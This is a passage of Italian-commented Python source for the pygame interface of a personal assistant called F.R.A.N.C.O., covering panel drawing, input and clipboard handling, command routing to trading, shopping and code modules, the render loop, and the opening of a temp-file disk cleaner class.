            amp = max(amp, h * 0.4 * abs(math.sin(self._pulse * 8)))
        self._wave_data = self._wave_data[1:] + [
            amp * random.uniform(0.75, 1.25) if amp > 0 else 0
        ]
        mid = y + h // 2
        if not any(self._wave_data):
            s = pygame.Surface((w, 1), pygame.SRCALPHA)
            s.fill((*self._C_DIM, 60))
            self._screen.blit(s, (x, mid))
            return
        pts = [(x + int(i * w / len(self._wave_data)), mid - int(v))
               for i, v in enumerate(self._wave_data)]
        if len(pts) >= 2:
            wsurf = pygame.Surface((w, h * 2), pygame.SRCALPHA)
            adj = [(px - x, py - y) for px, py in pts]
            pygame.draw.lines(wsurf, (*self._C_CORE, 180), False, adj, 2)
            self._screen.blit(wsurf, (x, y))

    # ── FLOATING PANELS (sovrapposizioni laterali) ────────────────────

    def _draw_left_panel(self, x: int, y: int, w: int, h: int):
        """Overlay sinistro semi-trasparente: sistema + trading."""
        PAD = 14
        cy = y + PAD

        def row(label, val, color=None):
            nonlocal cy
            l = self._txt(self._fonts["hud"], label, self._C_DIM)
            v = self._txt(self._fonts["hud"], str(val), color or self._C_TEXT)
            self._screen.blit(l, (x, cy))
            self._screen.blit(v, (x + 46, cy))
            cy += 16

        def sep():
            nonlocal cy
            s = pygame.Surface((w, 1), pygame.SRCALPHA)
            s.fill((*self._C_DIM, 60))
            self._screen.blit(s, (x, cy + 3))
            cy += 10

        # Sistema
        cpu  = float(self.state.get("cpu_percent", 0) or 0)
        ram  = float(self.state.get("ram_percent", 0) or 0)
        disk = float(self.state.get("disk_percent", 0) or 0)

        sect = self._txt(self._fonts["hud"], "SYSTEM", self._C_CORE)
        self._screen.blit(sect, (x, cy)); cy += sect.get_height() + 6

        for lbl, val in [("CPU", cpu), ("RAM", ram), ("DSK", disk)]:
            l = self._txt(self._fonts["hud"], lbl, self._C_DIM)
            self._screen.blit(l, (x, cy))
            self._draw_bar(x + 36, cy + 2, w - 56, 7, val,
                           fg=self._bar_color(val))
            pct = self._txt(self._fonts["hud"], f"{val:.0f}%",
                            self._bar_color(val))
            self._screen.blit(pct, (x + w - pct.get_width(), cy))
            cy += 18

        sep()

        # AI brain
        brain = self.state.get("ai_brain")
        if brain:
            sect2 = self._txt(self._fonts["hud"], "A I", self._C_CORE)
            self._screen.blit(sect2, (x, cy)); cy += sect2.get_height() + 4
            b = self._txt(self._fonts["hud"], str(brain)[:22], self._C_SUCCESS)
            self._screen.blit(b, (x, cy)); cy += 16
            sep()

        # Trading
        td = self.state.get("trading_panel") or {}
        total = td.get("total_value")
        if total:
            sect3 = self._txt(self._fonts["hud"], "TRADING", self._C_CORE)
            self._screen.blit(sect3, (x, cy)); cy += sect3.get_height() + 4
            pnl = float(td.get("day_pnl_pct", 0) or 0)
            pc = self._C_SUCCESS if pnl >= 0 else self._C_DANGER
            tv = self._txt(self._fonts["hud"], f"${float(total):,.0f}", self._C_TEXT)
            pv = self._txt(self._fonts["hud"], f" {pnl:+.2f}%", pc)
            self._screen.blit(tv, (x, cy))
            self._screen.blit(pv, (x + tv.get_width(), cy))
            cy += 16
            for pos in td.get("positions", [])[:3]:
                if cy > y + h - 20:
                    break
                sym = pos.get("symbol", "?")
                pnl2 = float(pos.get("pnl_pct", 0))
                pc2 = self._C_SUCCESS if pnl2 >= 0 else self._C_DANGER
                ls = self._txt(self._fonts["hud"], f"{sym:<5} {pnl2:+.1f}%", pc2)
                self._screen.blit(ls, (x, cy)); cy += 15

    def _draw_right_panel(self, x: int, y: int, w: int, h: int):
        theme = self._get_theme()
        INPUT_H  = 42
        HDR_H    = 34

        self._screen.blit(self._glow_surf(w, h, theme["panel"], 200, r=6), (x, y))
        pygame.draw.rect(self._screen, theme["border"], (x, y, w, h), 1, border_radius=6)

        # Header
        ch = self._txt(self._fonts["bold"], "CHAT", theme["primary"])
        self._screen.blit(ch, (x + 10, y + 8))
        hint = self._txt(self._fonts["hud"], "[T] per scrivere", theme["text_dim"])
        self._screen.blit(hint, (x + w - hint.get_width() - 8, y + 10))
        pygame.draw.line(self._screen, theme["border"],
                         (x + 6, y + HDR_H), (x + w - 6, y + HDR_H))

        # Area messaggi
        msg_y = y + HDR_H + 4
        msg_h = h - HDR_H - INPUT_H - 14
        msg_w = w - 20

        old_clip = self._screen.get_clip()
        self._screen.set_clip(pygame.Rect(x, msg_y, w, msg_h))

        self._sync_chat()
        lh = 16
        pad = 6
        draw_y = msg_y + msg_h - 4

        for role, text, ts in reversed(self._chat_lines):
            wrapped = self._wrap(text, self._fonts["hud"], msg_w - 22)
            bh = len(wrapped) * lh + pad * 2

            if draw_y - bh < msg_y - 10:
                break
            draw_y -= bh + 4

            is_franco = (role == "FRANCO")
            bx = x + 10
            col = theme["accent"] if is_franco else theme["text_primary"]
            bg_a = 65 if is_franco else 40
            bg_c = theme["secondary"] if is_franco else theme["bg_light"]

            bubble = pygame.Surface((msg_w, bh), pygame.SRCALPHA)
            br, bg_, bb = bg_c
            bubble.fill((br, bg_, bb, bg_a))
            if is_franco:
                accent_r, accent_g, accent_b = theme["accent"]
                pygame.draw.rect(bubble, (accent_r, accent_g, accent_b, 180), (0, 0, 3, bh))
            self._screen.blit(bubble, (bx, draw_y))

            ty = draw_y + pad
            for wl in wrapped:
                ws = self._txt(self._fonts["hud"], wl, col)
                self._screen.blit(ws, (bx + 8, ty))
                ty += lh

            if ts:
                tss = self._txt(self._fonts["hud"], ts, theme["text_dim"])
                self._screen.blit(tss, (bx + msg_w - tss.get_width() - 4, draw_y + 2))

        self._screen.set_clip(old_clip)

        # Input box
        iy = y + h - INPUT_H - 5
        iw = w - 20
        ib_col = theme["primary"] if self._input_active else theme["border"]
        pygame.draw.rect(self._screen, theme["bg_medium"],
                         (x + 10, iy, iw, INPUT_H), border_radius=5)
        pygame.draw.rect(self._screen, ib_col,
                         (x + 10, iy, iw, INPUT_H), 1, border_radius=5)

        cursor = "|" if self._input_active and int(self._pulse * 3) % 2 == 0 else ""
        disp = self._input_text + cursor if self._input_text else (
            "Scrivi un messaggio..." if not self._input_active else cursor
        )
        tc = theme["text_primary"] if self._input_text else theme["text_dim"]
        it = self._txt(self._fonts["input"], disp, tc)
        # Tronca se troppo lungo
        max_iw = iw - 16
        if it.get_width() > max_iw:
            visible_chars = max(0, len(self._input_text) - 20)
            disp2 = "..." + (self._input_text + cursor)[visible_chars:]
            it = self._txt(self._fonts["input"], disp2, tc)
        self._screen.blit(it, (x + 16, iy + (INPUT_H - it.get_height()) // 2))

    # ---- EVENTS ----

    def _paste_from_clipboard(self) -> str:
        """Legge il testo dagli appunti (pyperclip → pygame.scrap → powershell)."""
        # 1. pyperclip (già importato in FRANCO)
        try:
            import pyperclip
            txt = pyperclip.paste()
            if txt:
                return txt.replace("\r\n", " ").replace("\n", " ").replace("\r", " ")
        except Exception as _e:
            pass  # suppressed error
        # 2. pygame.scrap
        try:
            pygame.scrap.init()
            raw = pygame.scrap.get(pygame.SCRAP_TEXT)
            if raw:
                return raw.decode("utf-8", errors="ignore").replace("\r","").replace("\n"," ").strip("\x00")
        except Exception as _e:
            pass  # suppressed error
        # 3. PowerShell fallback
        try:
            import subprocess
            r = subprocess.run(["powershell","-command","Get-Clipboard"],
                               capture_output=True, text=True, timeout=2)
            return r.stdout.strip().replace("\n"," ")
        except Exception as _e:
            pass  # suppressed error
        return ""

    def _handle_events(self) -> bool:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                # Ignora QUIT nei primi 2 secondi (false positive di avvio)
                if not hasattr(self, "_start_time"):
                    self._start_time = time.time()
                if time.time() - self._start_time > 2.0:
                    return False
                continue

            if self._orb_experience.handle(event):
                continue
            if self._active_section == "canvas" and self._canvas.handle_event(event):
                continue

            # ── Tastiera ─────────────────────────────────────────────────
            if event.type == pygame.KEYDOWN:
                ctrl = bool(event.mod & (pygame.KMOD_CTRL | pygame.KMOD_META))

                if event.key == pygame.K_ESCAPE:
                    if self._sec_input_active:
                        self._sec_input_active = False
                        self._sec_input_text = ""
                    elif self._input_active:
                        self._input_active = False
                        self._input_text = ""
                    # ESC a schermo home non chiude più FRANCO (evita chiusure
                    # accidentali durante la conversazione). Per uscire: chiudi
                    # la finestra o Ctrl+Q.

                elif ctrl and event.key == pygame.K_q:
                    return False

                elif event.key == pygame.K_F11:
                    pygame.display.toggle_fullscreen()

                elif self._sec_input_active:
                    # ── Input bar sezione (tutte tranne home) ────────────
                    if event.key == pygame.K_RETURN and not ctrl:
                        cmd = self._sec_input_text.strip()
                        if cmd:
                            self._sec_cmd_history.append(cmd)
                            self._sec_history_idx = -1
                            self._dispatch_section_cmd(cmd)
                        self._sec_input_text = ""
                        self._sec_input_active = False

                    elif event.key == pygame.K_UP:
                        # History su
                        if self._sec_cmd_history:
                            self._sec_history_idx = min(
                                self._sec_history_idx + 1,
                                len(self._sec_cmd_history) - 1)
                            idx = len(self._sec_cmd_history) - 1 - self._sec_history_idx
                            self._sec_input_text = self._sec_cmd_history[idx]

                    elif event.key == pygame.K_DOWN:
                        if self._sec_history_idx > 0:
                            self._sec_history_idx -= 1
                            idx = len(self._sec_cmd_history) - 1 - self._sec_history_idx
                            self._sec_input_text = self._sec_cmd_history[idx]
                        else:
                            self._sec_history_idx = -1
                            self._sec_input_text = ""

                    elif event.key == pygame.K_BACKSPACE:
                        if ctrl:
                            import re as _re
                            self._sec_input_text = _re.sub(r'\S+\s*$', '', self._sec_input_text)
                        else:
                            self._sec_input_text = self._sec_input_text[:-1]

                    elif event.key == pygame.K_DELETE:
                        self._sec_input_text = ""

                    elif event.key == pygame.K_v and ctrl:
                        self._sec_input_text += self._paste_from_clipboard()

                    elif event.key == pygame.K_TAB:
                        # Autocomplete comandi comuni per sezione
                        self._sec_input_text = self._autocomplete_sec(self._sec_input_text)

                    else:
                        ch = event.unicode
                        if ch and ch.isprintable():
                            self._sec_input_text += ch

                elif self._input_active:
                    # ── Input home/chat (comportamento originale) ─────────
                    if event.key == pygame.K_RETURN and not ctrl:
                        cmd = self._input_text.strip()
                        if cmd:
                            self.command_queue.put(cmd)
                            self.transcript_buffer.append(("USER", cmd, datetime.now()))
                        self._input_text = ""
                        self._input_active = False

                    elif event.key == pygame.K_BACKSPACE:
                        if ctrl:
                            import re as _re
                            self._input_text = _re.sub(r'\S+\s*$', '', self._input_text)
                        else:
                            self._input_text = self._input_text[:-1]

                    elif event.key == pygame.K_DELETE:
                        self._input_text = ""

                    elif event.key == pygame.K_v and ctrl:
                        self._input_text += self._paste_from_clipboard()

                    elif event.key == pygame.K_a and ctrl:
                        pass

                    else:
                        ch = event.unicode
                        if ch and ch.isprintable():
                            self._input_text += ch

                else:
                    # ── Scorciatoie globali ──────────────────────────────
                    if event.key in (pygame.K_t, pygame.K_RETURN):
                        if self._active_section in ("home", "chat"):
                            self._input_active = True
                        else:
                            self._sec_input_active = True

                    elif event.key == pygame.K_v and ctrl:
                        txt = self._paste_from_clipboard()
                        if txt:
                            if self._active_section in ("home", "chat"):
                                self._input_text = txt
                                self._input_active = True
                            else:
                                self._sec_input_text = txt
                                self._sec_input_active = True

                    elif event.key == pygame.K_1: self._active_section = "home"
                    elif event.key == pygame.K_2: self._active_section = "chat"
                    elif event.key == pygame.K_3: self._active_section = "trading"
                    elif event.key == pygame.K_4: self._active_section = "shopping"
                    elif event.key == pygame.K_5: self._active_section = "code"
                    elif event.key == pygame.K_6: self._active_section = "auto"
                    elif event.key == pygame.K_7: self._active_section = "brain"
                    elif event.key == pygame.K_8: self._active_section = "canvas"

                    elif event.key == pygame.K_p and ctrl:
                        self.command_queue.put("__PALETTE__")
                    elif event.key == pygame.K_PAGEUP:
                        self._section_scroll[self._active_section] = \
                            self._section_scroll.get(self._active_section, 0) + 5
                    elif event.key == pygame.K_PAGEDOWN:
                        s = self._section_scroll.get(self._active_section, 0)
                        self._section_scroll[self._active_section] = max(0, s - 5)
                    elif event.key == pygame.K_UP:
                        self._chat_scroll = min(self._chat_scroll + 3, 100)
                    elif event.key == pygame.K_DOWN:
                        self._chat_scroll = max(0, self._chat_scroll - 3)

            # ── Mouse click ──────────────────────────────────────────────
            if event.type == pygame.MOUSEBUTTONDOWN and event.button == 1:
                mx, my = event.pos
                sw = self._screen.get_width()
                sh = self._screen.get_height()

                # Click sidebar → cambia sezione
                if self._handle_sidebar_click((mx, my)):
                    self._input_active = False
                    self._sec_input_active = False
                    continue

                # Click tab mode (Text Only, Voice Only, ecc.)
                self._handle_mode_tab_click((mx, my))

                # Click barra input sezione (bottom bar in ogni sezione non-home)
                if self._active_section not in ("home",):
                    input_bar_y = sh - 42
                    if mx > self._sidebar_w and my >= input_bar_y:
                        self._sec_input_active = True
                        self._input_active = False
                        continue

                # Click area input home/chat
                if self._active_section in ("home", "chat"):
                    RIGHT_W = max(220, min(340, sw // 4))
                    right_x = sw - RIGHT_W - 14
                    if mx >= right_x and my >= sh - 80:
                        self._input_active = True
                        self._sec_input_active = False
                        continue

                # Click fuori → chiude tutti gli input
                self._input_active = False
                self._sec_input_active = False

            # ── Scroll ───────────────────────────────────────────────────
            if event.type == pygame.MOUSEWHEEL:
                sec = self._active_section
                if sec in ("home", "chat"):
                    self._chat_scroll = max(0, self._chat_scroll - event.y * 2)
                else:
                    cur = self._section_scroll.get(sec, 0)
                    self._section_scroll[sec] = max(0, cur - event.y * 2)

        return True

    def _handle_mode_tab_click(self, pos: tuple):
        """Gestisce click sui tab mode (Text Only, Voice Only, Silent, + Text)."""
        # Ricostruisce le posizioni dei tab come in _draw_mode_tabs
        # e imposta lo stato voce di conseguenza
        mx, my = pos
        if my < 50 or my > 82:   # fuori dalla riga tab
            return
        # Tab cliccato — identifica quale in base alla X
        # Usa lo state per cambiare modalità
        try:
            # Tab click detection (heuristica basata su posizione) — usiamo heuristica
            # Heuristica: 4 tab larghi ~80px ciascuno, centrati su sphere_cx
            w = self._screen.get_width()
            SW = self._sidebar_w
            sphere_cx = SW + (w - SW) // 2
            tab_labels = ["+ Text", "Text Only", "Voice Only", "Silent"]
            total_w = sum(len(l) * 8 + 32 for l in tab_labels)
            x = sphere_cx - total_w // 2
            for i, label in enumerate(tab_labels):
                tw = len(label) * 8 + 32
                if x <= mx <= x + tw:
                    if label == "+ Text":
                        # Alterna input attivo
                        self._input_active = not self._input_active
                    elif label == "Text Only":
                        self.state.set("voice_enabled", False)
                        self.state.set("text_only", True)
                        self._input_active = True
                        self._active_section = "chat"
                    elif label == "Voice Only":
                        self.state.set("voice_enabled", True)
                        self.state.set("text_only", False)
                        self._input_active = False
                    elif label == "Silent":
                        self.state.set("system_state", SystemState.STANDBY)
                        self._input_active = False
                    break
                x += tw
        except Exception as _e:
            pass  # suppressed error

    # ── ROUTER COMANDI SEZIONE ───────────────────────────────────────────────

    # Placeholder suggerimenti per autocomplete per sezione
    _SEC_HINTS = {
        "trading":  ["portafoglio","stream status","compra ","vendi ","rotazione status","stop trading","analisi"],
        "shopping": ["cerca ","aggiungi ","mostra carte","spesa oggi","svuota carrello","checkout"],
        "code":     ["apri progetto ","agente: ","mostra modifiche","applica modifiche","esegui nel progetto: "],
        "canvas":   ["crea un cerchio giallo","crea un rettangolo blu","sposta a destra","ridimensiona 200 120","cambia colore rosso","elimina"],
        "auto":     ["mostra regole","crea regola: ","attiva regola ","disattiva regola ","ogni mattina alle 9"],
        "brain":    ["ricorda ","cosa sai su ","dimentica ","mostra memoria","cerca in memoria "],
        "chat":     [],
    }

    def _autocomplete_sec(self, text: str) -> str:
        sec  = self._active_section
        hint = self._SEC_HINTS.get(sec, [])
        t    = text.lower()
        for h in hint:
            if h.startswith(t) and h != t:
                return h
        return text

    def _dispatch_section_cmd(self, cmd: str):
        """
        Router centrale: invia il comando al modulo giusto in base alla sezione
        attiva oppure tramite keyword globali, poi mostra l'output inline.
        Gira sempre in un thread separato per non bloccare la UI.
        """
        sec = self._active_section
        # Mostra subito l'input come "echo"
        self._push_sec_output(sec, f"> {cmd}", color="dim")

        def _run():
            try:
                result = self._route_cmd(sec, cmd)
            except Exception as e:
                result = f"Errore: {e}"
            if result:
                self._push_sec_output(sec, result)
                # TTS breve (prime 120 char) se voce attiva
                if not self.state.get("text_only") and result:
                    try:
                        franco = getattr(self, "_franco_ref", None)
                        if franco and hasattr(franco, "tts"):
                            short = result.split("\n")[0][:120]
                            franco.tts.speak(short)
                    except Exception as _e:
                        pass  # suppressed error

        threading.Thread(target=_run, daemon=True, name="SecCmdRouter").start()

    def _push_sec_output(self, sec: str, text: str, color: str = "normal"):
        """Aggiunge una riga all'output inline della sezione (max 80 righe)."""
        if sec not in self._sec_output:
            self._sec_output[sec] = []
        entry = {"text": text, "color": color, "ts": datetime.now().strftime("%H:%M:%S")}
        self._sec_output[sec].append(entry)
        if len(self._sec_output[sec]) > 80:
            self._sec_output[sec] = self._sec_output[sec][-80:]

    def _route_cmd(self, sec: str, cmd: str) -> str:
        """
        Routing logico: ogni sezione ha priorità sui propri comandi,
        ma il CommandEngine globale è sempre il fallback.
        I comandi vocali arrivano qui già smistati per sezione attiva.
        """
        franco = getattr(self, "_franco_ref", None)
        t      = cmd.lower().strip()

        if sec == "canvas":
            return self._canvas.apply_command(cmd) or "Comando canvas non riconosciuto."

        # ── TRADING ───────────────────────────────────────────────────────
        if sec == "trading" or any(k in t for k in (
                "portafoglio","compra ","vendi ","azioni","trading","borsa",
                "stream","rotazione","stop trading","pnl","dividendi")):
            if franco and hasattr(franco, "engine"):
                return franco.engine.process(cmd) or ""

        # ── SHOPPING ──────────────────────────────────────────────────────
        if sec == "shopping" or any(k in t for k in (
                "aggiungi","cerca ","acquista","carrello","spesa","carta",
                "amazon","checkout","ordine")):
            if franco and hasattr(franco, "engine"):
                return franco.engine.process(cmd) or ""

        # ── CODE ──────────────────────────────────────────────────────────
        if sec == "code" or any(k in t for k in (
                "apri progetto","agente:","cod3","mostra modifiche",
                "applica modifiche","esegui nel progetto","autonomia:")):
            if franco and hasattr(franco, "engine"):
                return franco.engine.process(cmd) or ""

        # ── AUTOMAZIONI ───────────────────────────────────────────────────
        if sec == "auto" or any(k in t for k in (
                "mostra regole","crea regola","attiva regola","disattiva regola",
                "ogni ","quando ","se ","automaz")):
            if franco and hasattr(franco, "engine"):
                return franco.engine.process(cmd) or ""

        # ── SECOND BRAIN ──────────────────────────────────────────────────
        if sec == "brain" or any(k in t for k in (
                "ricorda ","cosa sai","dimentica","mostra memoria","cerca in memoria")):
            if franco and hasattr(franco, "engine"):
                return franco.engine.process(cmd) or ""

        # ── FALLBACK: CommandEngine globale ───────────────────────────────
        if franco and hasattr(franco, "engine"):
            return franco.engine.process(cmd) or ""

        return "Modulo non disponibile."

    def voice_route(self, text: str):
        """
        Chiamato dal thread voce: smista il comando alla sezione giusta
        e aggiorna la sezione attiva di conseguenza.
        """
        t = text.lower()

        # Cambio sezione esplicito via voce
        if any(k in t for k in ("apri trading","vai trading","sezione trading",
                                  "mostra trading","apri portafoglio")): self._active_section = "trading"
        elif any(k in t for k in ("apri shopping","vai shopping","sezione shopping",
                                   "apri negozio","carrello")): self._active_section = "shopping"
        elif any(k in t for k in ("apri automaz","vai auto","sezione auto",
                                   "regole","automazione","quando ","ogni giorno")): self._active_section = "auto"
        elif any(k in t for k in ("apri brain","vai brain","sezione brain","apri memoria",
                                   "secondo cervello","cosa ricordi","cosa sai")): self._active_section = "brain"
        elif any(k in t for k in ("apri code","vai code","sezione code","apri progetto",
                                   "agente:","cod3","scrivi codice","modifica codice")): self._active_section = "code"
        elif any(k in t for k in ("apri chat","vai chat","sezione chat",
                                   "chat con franco","parla con me")): self._active_section = "chat"

        # Smista il comando alla sezione corrente
        self._dispatch_section_cmd(text)

    # ── DRAW INPUT BAR UNIFICATA ─────────────────────────────────────────────

    def _draw_section_input_bar(self, x: int, y: int, w: int, h: int, sec_color: tuple):
        """
        Input bar in basso in ogni sezione non-home.
        Mostra: [● o ✉] placeholder | testo | cursore
        """
        BAR_H = 34
        bar_y = y + h - BAR_H - 2
        active = self._sec_input_active

        # Sfondo bar
        bg = pygame.Surface((w - 4, BAR_H), pygame.SRCALPHA)
        if active:
            bg.fill((10, 20, 40, 230))
        else:
            bg.fill((5, 12, 28, 180))
        self._screen.blit(bg, (x + 2, bar_y))
        border_col = sec_color if active else (*self._C_DIM, 80)
        pygame.draw.rect(self._screen, border_col,
                         (x + 2, bar_y, w - 4, BAR_H), 1, border_radius=6)

        # Icona modalità
        voice_on = not self.state.get("text_only", False)
        icon = "●" if voice_on else "✉"
        try:
            fi = self._fonts.get("hud")
            is_ = fi.render(icon, True, sec_color if active else self._C_DIM)
            self._screen.blit(is_, (x + 10, bar_y + (BAR_H - is_.get_height()) // 2))
        except Exception as _e:
            pass  # suppressed error

        # Testo + cursore
        text = self._sec_input_text
        if not text and not active:
            text = "Scrivi un comando… (T / Invio / Voce)"
            col  = self._C_DIM
        elif not text and active:
            text = ""
            col  = self._C_TEXT
        else:
            col  = self._C_TEXT

        cursor = "_" if active and int(time.time() * 2) % 2 == 0 else ""
        display = text + cursor

        try:
            fi  = self._fonts.get("small") or self._fonts.get("hud")
            ts_ = fi.render(display[:90], True, col)
            self._screen.blit(ts_, (x + 36, bar_y + (BAR_H - ts_.get_height()) // 2))
        except Exception as _e:
            pass  # suppressed error

        # Hint "Enter per inviare"
        if active and text:
            try:
                fh = self._fonts.get("tiny") or self._fonts.get("hud")
                hs = fh.render("↵ Invio", True, (*sec_color, 160))
                self._screen.blit(hs, (x + w - hs.get_width() - 10,
                                       bar_y + (BAR_H - hs.get_height()) // 2))
            except Exception as _e:
                pass  # suppressed error

        return bar_y  # ritorna la y della bar per calcolare altezza contenuto

    def _draw_sec_output(self, x: int, y: int, w: int, h: int, sec: str, sec_color: tuple):
        """
        Disegna l'output inline della sezione: ultime N righe.
        Rispetta il scroll della sezione.
        """
        if sec not in self._sec_output or not self._sec_output[sec]:
            return

        lines_data = self._sec_output[sec]
        lh = 14
        scroll = self._section_scroll.get(sec, 0)
        max_lines = h // lh

        # Calcola slice visibile
        total = len(lines_data)
        start = max(0, total - max_lines - scroll)
        end   = max(0, total - scroll)
        visible = lines_data[start:end]

        old_clip = self._screen.get_clip()
        self._screen.set_clip(pygame.Rect(x, y, w, h))

        draw_y = y + h - lh
        for entry in reversed(visible):
            if draw_y < y:
                break
            txt = entry.get("text", "")
            clr_key = entry.get("color", "normal")
            if clr_key == "dim":
                col = self._C_DIM
            elif clr_key == "error":
                col = self._C_DANGER
            elif clr_key == "success":
                col = (0, 220, 130)
            else:
                col = self._C_TEXT

            # Wrap lunghe
            fi = self._fonts.get("tiny") or self._fonts.get("hud")
            if fi:
                wrapped = self._wrap(txt, fi, w - 8)
                for line in reversed(wrapped):
                    try:
                        ls = fi.render(line, True, col)
                        self._screen.blit(ls, (x + 4, draw_y))
                    except Exception as _e:
                        pass  # suppressed error
                    draw_y -= lh
                    if draw_y < y:
                        break

        self._screen.set_clip(old_clip)

    def _draw_chatgpt_home(self, x: int, y: int, w: int, h: int):
        """Schermata principale stile ChatGPT: conversazione al centro e composer in basso."""
        self._orb_experience.home(x, y, w, h)
        return
        self._sync_chat()
        max_w = min(820, max(320, w - 48))
        cx = x + w // 2
        chat_x = cx - max_w // 2
        top = y + 16
        bottom_input_h = 64
        messages_bottom = y + h - bottom_input_h - 24

        if not self._chat_lines:
            title = self._txt(self._fonts["large"], "Cosa facciamo oggi?", (245, 245, 245))
            self._screen.blit(title, (cx - title.get_width() // 2, y + h // 2 - 70))
            sub = self._txt(self._fonts["normal"], "Scrivi o parla con Franco.", (170, 170, 170))
            self._screen.blit(sub, (cx - sub.get_width() // 2, y + h // 2 - 34))
        else:
            old_clip = self._screen.get_clip()
            self._screen.set_clip(pygame.Rect(chat_x, top, max_w, messages_bottom - top))
            draw_y = messages_bottom - 8
            for role, text, ts in reversed(self._chat_lines[-18:]):
                is_user = role.upper() in ("USER", "UTENTE")
                font = self._fonts["normal"]
                wrapped = self._wrap(text, font, max_w - 160)
                bubble_w = min(max_w - 80, max(160, max((font.size(line)[0] for line in wrapped), default=120) + 28))
                bubble_h = len(wrapped) * 20 + 20
                if draw_y - bubble_h < top:
                    break
                draw_y -= bubble_h + 12
                bx = chat_x + max_w - bubble_w if is_user else chat_x
                bg = (47, 47, 47) if is_user else (24, 24, 24)
                border = (64, 64, 64) if is_user else (38, 38, 38)
                pygame.draw.rect(self._screen, bg, (bx, draw_y, bubble_w, bubble_h), border_radius=18)
                pygame.draw.rect(self._screen, border, (bx, draw_y, bubble_w, bubble_h), 1, border_radius=18)
                ty = draw_y + 10
                for line in wrapped:
                    surf = self._txt(font, line, (245, 245, 245))
                    self._screen.blit(surf, (bx + 14, ty))
                    ty += 20
            self._screen.set_clip(old_clip)

        composer = pygame.Rect(chat_x, y + h - bottom_input_h - 10, max_w, 54)
        pygame.draw.rect(self._screen, (32, 32, 32), composer, border_radius=18)
        pygame.draw.rect(self._screen, (72, 72, 72) if self._input_active else (48, 48, 48), composer, 1, border_radius=18)
        cursor = "|" if self._input_active and int(self._pulse * 3) % 2 == 0 else ""
        disp = self._input_text + cursor if self._input_text else ("Messaggio a Franco" if not self._input_active else cursor)
        color = (245, 245, 245) if self._input_text else (150, 150, 150)
        surf = self._txt(self._fonts["input"], disp, color)
        if surf.get_width() > composer.width - 76:
            tail = (self._input_text + cursor)[-70:]
            surf = self._txt(self._fonts["input"], "..." + tail, color)
        self._screen.blit(surf, (composer.x + 18, composer.y + (composer.height - surf.get_height()) // 2))
        send = pygame.Rect(composer.right - 42, composer.y + 11, 32, 32)
        pygame.draw.circle(self._screen, (245, 245, 245), send.center, 16)
        arrow = self._txt(self._fonts["bold"], "↑", (18, 18, 18))
        self._screen.blit(arrow, (send.centerx - arrow.get_width() // 2, send.centery - arrow.get_height() // 2 - 1))
    # ---- MAIN LOOP ----

    def run(self):
        if not self._init_pygame():
            self.logger.info("UI", "Modalita headless")
            return

        self._running = True
        _frame = 0

        while self._running and self.state.get("running", True):
            _frame += 1
            try:
                _ok = self._handle_events()
            except Exception as _ev_err:
                self.logger.error("UI", f"handle_events crash frame {_frame}: {_ev_err}")
                _ok = True  # non chiudere per un singolo errore evento
            if not _ok:
                self.logger.info("UI", f"Quit segnalato al frame {_frame}")
                self.state.set("running", False)
                break

            self._orb_experience.sync_window()

            w, h = self._screen.get_width(), self._screen.get_height()

            self._angle += 0.006
            self._pulse += 0.030
            self._update_particles()

            try:
                # ── Background ───────────────────────────────────────────
                self._draw_background()

                SW = self._sidebar_w
                CX = SW + (w - SW) // 2

                # ── Sidebar sezioni ───────────────────────────────────────
                self._draw_sidebar_nav(h)

                # ── Header ────────────────────────────────────────────────
                self._draw_header()

                # ── Area contenuto ────────────────────────────────────────
                CONTENT_X = SW + 4
                CONTENT_Y = 52
                CONTENT_W = w - SW - 4
                CONTENT_H = h - CONTENT_Y - 8

                if bool(self.state.get("standby")) or self.state.get("system_state") == SystemState.STANDBY:
                    self._draw_compact_background_widget()
                elif self._active_section == "home":
                    self._draw_chatgpt_home(CONTENT_X, CONTENT_Y, CONTENT_W, CONTENT_H)
                else:
                    self._draw_section_content(CONTENT_X, CONTENT_Y, CONTENT_W, CONTENT_H)

                # ── Notifiche ─────────────────────────────────────────────
                self._draw_notifications_bottom(CX, h - 12)

                # ── Versione ──────────────────────────────────────────────
                ver = self._txt(self._fonts["hud"],
                                f"F.R.A.N.C.O. v{__version__}", self._C_DIM)
                self._screen.blit(ver, (w - ver.get_width() - 14, h - 18))

            except Exception as _draw_err:
                import traceback as _tb
                try:
                    self.logger.error("UI", f"Draw error frame {_frame}: {_draw_err}\n{_tb.format_exc()}")
                except Exception as _e:
                    pass  # suppressed error

            pygame.display.flip()
            target_fps = 20 if (self._orb_experience.compact or self.state.get("light_mode", False)) else UI_FPS
            self._clock.tick(target_fps)

        pygame.quit()
        self.logger.info("UI", "Interfaccia chiusa")

    def _draw_notifications_bottom(self, cx: int, bottom_y: int):
        """Notifiche flottanti in basso al centro."""
        notifs = list(self._notifications)
        if not notifs:
            return
        y = bottom_y
        for notif in reversed(list(notifs)[-2:]):
            lvl = notif.get("level", "info")
            col = (self._C_DANGER if lvl == "danger" else
                   self._C_WARN   if lvl == "warning" else
                   self._C_SUCCESS if lvl == "success" else
                   self._C_DIM)
            txt = f"  {notif.get('ts','')}  {notif.get('text','')[:70]}  "
            ns = self._txt(self._fonts["hud"], txt, col)
            bw, bh = ns.get_width() + 24, ns.get_height() + 10
            bg = self._glow_surf(bw, bh, col, 20, r=6)
            self._screen.blit(bg, (cx - bw // 2, y - bh))
            pygame.draw.rect(self._screen, col,
                             (cx - bw // 2, y - bh, bw, bh), 1, border_radius=6)
            self._screen.blit(ns, (cx - ns.get_width() // 2, y - bh + 5))
            y -= bh + 6


# ==============================================================================
# DISK CLEANER — Libera spazio disco come Jarvis
# ==============================================================================

class DiskCleaner:
    """
    Analizza e libera spazio disco:
    - File temporanei Windows/sistema
    - Cache browser, prefetch, thumbnails
    - Cartella Temp utente e sistema
    - File di log vecchi
    - Cestino
    - Download vecchi (con conferma)
    """

    # Cartelle temp sicure da svuotare
    SAFE_TEMP_DIRS: List[Path] = []
    # Estensioni file da pulire
    JUNK_EXTENSIONS = {
        ".tmp", ".temp", ".bak", ".old", ".log", ".dmp",
        ".chk", ".gid", ".fts", ".ftg", "~", ".swp"
    }

    def __init__(self, logger: "StructuredLogger"):
        self.logger = logger
        self._build_target_dirs()

    def _build_target_dirs(self):
        targets = [
            Path(os.environ.get("TEMP", "")),
            Path(os.environ.get("TMP", "")),
            Path(os.environ.get("LOCALAPPDATA", "")) / "Temp",
            Path("C:/Windows/Temp"),
            Path(os.environ.get("LOCALAPPDATA", "")) / "Microsoft/Windows/INetCache",
